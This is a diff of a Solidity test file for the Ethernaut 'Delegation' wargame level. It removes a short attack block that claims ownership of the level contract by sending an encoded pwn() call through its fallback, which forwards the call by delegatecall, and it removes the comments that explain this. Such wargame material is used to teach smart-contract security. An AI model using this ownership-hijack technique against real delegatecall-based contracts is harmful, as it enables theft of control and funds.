@@ -27,17 +27,7 @@ contract DelegationTest is Test {
         /****************
          *    Attack     *
          *************** */
-        /*
-         *The more direct way to call the Delegate and claim ownership
-         * is through the fallback function, as this function call it and pass it msg.data
-         * we can encode the function signature of the pwn() function, there are 2 ways:
-         * 1.
-         * address(ethernautDelegation).call(abi.encode(bytes4(keccak256("pwn()"))));
-         *2.
-         */
-        (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
-        require(success);
-        assertEq(ethernautDelegation.owner(), player);
+
         /*****************
          *Level Submission*
          ***************  */
